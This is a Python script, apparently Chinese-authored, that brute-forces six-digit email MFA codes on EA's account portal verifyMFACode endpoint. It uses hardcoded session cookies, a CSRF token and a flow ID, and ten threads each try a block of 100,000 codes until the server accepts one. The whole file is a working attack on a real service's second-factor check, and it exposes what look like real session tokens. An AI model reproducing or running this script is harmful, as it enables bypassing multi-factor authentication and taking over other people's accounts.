import multiprocessing
from ctypes import c_bool

from concurrent.futures import ThreadPoolExecutor
from threading import Thread

import requests

headers = {
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,la;q=0.6,ca;q=0.5,cy;q=0.4,ja;q=0.3,so;q=0.2,th;q=0.1,es;q=0.1,und;q=0.1,pt;q=0.1,lb;q=0.1,fr;q=0.1",
    "Connection": "keep-alive",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "https://myaccount.ea.com",
    "Referer": "https://myaccount.ea.com/cp-ui/orderhistory/index",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "X-CSRF-TOKEN": "6259afaa-63f3-4632-8f11-69d12d8506a0",
    "X-Requested-With": "XMLHttpRequest",
    "sec-ch-ua": "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\", \"Google Chrome\";v=\"110\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"macOS\""
}
cookies = {
    "entry_url": "https://myaccount.ea.com/cp-ui/aboutme/index?gameId=ebisu",
    "JSESSIONID": "84FCADB3EACC0C14B39FC2E0A7385917.prdcustomer-portal-0",
    "cp-cookie": "\"4dfc665214a069f6\"",
    "ealocale": "zh-cn",
    "notice_preferences": "100",
    "notice_behavior": "none",
    "ak_bmsc": "0B19ECF8E25A8B9D719639F7906CC635~000000000000000000000000000000~YAAQHjArF2YuEzOGAQAA8aBMpxKSpqUxMzxB1H3cDfnKVYT9lFWOEJ3/YuvR+NIp8n0zeOMi8GCcI8wuTEH3EWPDECzIKH6yTjsoZ1tiqwgLxgCkbMypIxiurjX9IcvfWkflNAhq+baBo947MxMOsJrVjpkENX4MdHO0jFwsfwJHgvJTJBUSsFZHW2rOBegLbCRHuYwer2t+FYh/VUsm9KFQtyKlmqG5BKE4z9g9coDCaOm/XoFKYl0Npgdf5ovhI+bsdoRxuU3TXn1r1TowR+LGuiZoVfE7you4eJ8Z2dsdtC0oGwKvGWJpvE7DfNyOxp+nYCjWDXolnIGwSJU84faSjrKToi/VTDOrhDMs5EE6lJjddAEEev0PhGh1UTx8Mb2ORJj8aW1HiEIUppKnwCu2zDZO3k7CAeKaOJDevZQREGpGCy8XblMvraheG0J1bYu/AMx4w9fF2iY7LsmYtFp5khUmdTR2fgOkjmm/AD9tRX3i+nlUog==",
    "_gid": "GA1.2.1798527142.1677844064",
    "_nx_mpcid": "eddb2918-820f-42ca-8d67-15b3c62e7508",
    "_gcl_au": "1.1.63204979.1677844110",
    "bm_sv": "4F2461F8AD7A3311DDEB04EA5461F7E3~YAAQHjArF+sKFDOGAQAAn3V1pxI/SLmnp7j2U5idI3XgVeOaOLbGcH0KTwBL0Ntihiid6Jz8DWM4LgI/k6kOcPa31C5NIUSrjnYGfHMfP8xQN2D9mxeJlDSFgLna36JGCbeIKtLYqdgHBVo1UnEqeWifaZRadYSB8QHPkmmbB5J5jneBgHvOYHFTVLwSlU+y/xks6ud32jJFUdWZiebfUkAzOLNmE0TyDpuS2OabBIDUFqDSTJmHXeu55KLB~1",
    "_ga": "GA1.2.1235384675.1677844064",
    "_ga_Q3MDF068TF": "GS1.1.1677846693.2.1.1677846745.8.0.0"
}
url = "https://myaccount.ea.com/cp-ui/security/verifyMFACode"


def test():
    data = {
        "mfa_type": "EMAIL",
        "mfa_code": '317411',
        "fraudCheckType": "ORDER_HISTORY_VIEW",
        "flowId": "515c4eec-bbde-4760-8ee7-4de8e59a3b6f"
    }
    response = requests.post(url, headers=headers, cookies=cookies, data=data)
    print(response.text)
    print(response)


def run(start: int):
    for i in range(start, start + 99999):
        data = {
            "mfa_type": "EMAIL",
            "mfa_code": '{:0>6d}'.format(i),
            "fraudCheckType": "ORDER_HISTORY_VIEW",
            "flowId": "515c4eec-bbde-4760-8ee7-4de8e59a3b6f"
        }
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        if response.json()['status']:
            print(f'成功: {data["mfa_code"]}')
            return
        if response.status_code != 200:
            print('error')
            return None
        print(f'{data["mfa_code"]} 失败')


def muti_processing():
    t0 = Thread(target=run, args=(0,))
    t1 = Thread(target=run, args=(100000, ))
    t2 = Thread(target=run, args=(200000,))
    t3 = Thread(target=run, args=(300000,))
    t4 = Thread(target=run, args=(400000,))
    t5 = Thread(target=run, args=(500000,))
    t6 = Thread(target=run, args=(600000,))
    t7 = Thread(target=run, args=(700000,))
    t8 = Thread(target=run, args=(800000,))
    t9 = Thread(target=run, args=(900000,))

    t0.start()
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()
    t7.start()
    t8.start()
    t9.start()


if __name__ == '__main__':
    # test()
    muti_processing()
